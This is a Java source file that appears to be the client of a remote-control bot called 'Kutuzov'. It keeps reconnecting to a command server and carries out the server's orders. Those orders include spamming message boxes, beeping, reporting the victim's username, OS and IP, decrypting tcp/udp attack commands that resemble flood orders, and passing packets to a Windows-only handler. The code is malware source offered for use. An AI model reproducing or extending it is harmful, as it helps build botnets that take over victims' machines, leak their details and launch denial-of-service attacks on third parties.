package me.kutuzov.client;

import com.profesorfalken.jpowershell.OSDetector;
import com.sun.jna.platform.win32.GDI32;
import me.kutuzov.client.payloads.Payloads;
import me.kutuzov.packet.*;
import me.pk2.moodlyencryption.MoodlyEncryption;

import javax.swing.*;
import java.awt.*;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.InetAddress;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.concurrent.atomic.AtomicReference;

public class KutuzovEntry {
    public  static final String HOST = "localhost";
    public  static final int    PORT = 33901;

    private static Socket socket;
    private static long lastPing = System.currentTimeMillis();
    public  static void main(String[] args) {
        try {
            socket = new Socket(HOST, PORT);
        } catch (IOException e) {
            System.out.println("[M0] Connection lost, reconnecting...");
            while (true) {
                try {
                    Thread.sleep(100);
                    socket = new Socket(HOST, PORT);
                    break;
                } catch (Exception e1) {
                    System.out.println("[M1] Connection lost, reconnecting...");
                }
            }
        }
        Thread thread = new Thread(()->{
            ObjectInputStream ois = null;
            ObjectOutputStream oos = null;
            try {
                ois = new ObjectInputStream(socket.getInputStream());
                oos = new ObjectOutputStream(socket.getOutputStream());
            } catch (IOException e) {}

            while(true) {
                if(System.currentTimeMillis() - lastPing > 10000) {
                    System.out.println("[W0] Connection lost, reconnecting...");
                    while (true) {
                        try {
                            Thread.sleep(100);
                            socket = new Socket(HOST, PORT);
                            ois = new ObjectInputStream(socket.getInputStream());
                            oos = new ObjectOutputStream(socket.getOutputStream());
                            lastPing = System.currentTimeMillis();
                            break;
                        } catch (IOException | InterruptedException e1) {
                            System.out.println("[W1] Connection lost, reconnecting...");
                        }
                    }
                }

                try {
                    Object packet = ois.readObject();
                    if(packet instanceof SCKeepAlivePacket) {
                        lastPing = System.currentTimeMillis();
                    } else if(packet instanceof SCMessageBoxPacket) {
                        SCMessageBoxPacket scMessageBoxPacket = (SCMessageBoxPacket) packet;
                        for(int i = 0; i < scMessageBoxPacket.amount; i++)
                            new Thread(() -> JOptionPane.showMessageDialog(null, scMessageBoxPacket.content, scMessageBoxPacket.title, JOptionPane.INFORMATION_MESSAGE)).start();
                    } else if(packet instanceof SCDAPacket) {
                        SCDAPacket scDAPacket = (SCDAPacket) packet;
                        try {
                            MoodlyEncryption moodlyEncryption = new MoodlyEncryption();
                            moodlyEncryption.init(scDAPacket.data.substring(scDAPacket.data.length() - 16));
                            String decryptedData = moodlyEncryption.decrypt(scDAPacket.data.substring(0, scDAPacket.data.length() - 16).getBytes(StandardCharsets.UTF_8));
                            System.out.println("[CLIENT(" + socket.getLocalPort() + ")]  SCDAPacket:" + decryptedData);
                            String[] data = decryptedData.split(";");
                            String method = data[0];
                            switch (method) {
                                case "tcp":
                                    System.out.println("TCP[" + socket.getLocalPort() + "]: " + data[1] + " -> " + data[2]);
                                    break;
                                case "udp":
                                    System.out.println("UDP[" + socket.getLocalPort() + "]: " + data[1] + " -> " + data[2]);
                                    break;
                                default: break;
                            }

                            oos.writeObject(new CSDAResPacket(CSDAResPacket.RESPONSE_OK));
                        } catch (Exception e) {
                            oos.writeObject(new CSDAResPacket(CSDAResPacket.RESPONSE_ERROR));
                        }
                    } else if(packet instanceof SCRequireHandshakePacket) {
                        String identifierName = System.getProperty("user.name");
                        String os = System.getProperty("os.name");
                        String localHost = InetAddress.getLocalHost().getHostAddress();
                        oos.writeObject(new CSHandshakePacket(identifierName, localHost, os));
                    } else if(packet instanceof SCBeepPacket)
                        Toolkit.getDefaultToolkit().beep();
                      else if(OSDetector.isWindows())
                        KutuzovWinPackets.handlePacket(ois, oos, (Packet)packet);
                } catch (Exception ignored) {}
            }
        });
        thread.start();

        /*Thread.sleep(8000);
        for(Socket socket : sockets)
            socket.close();
            */
    }
}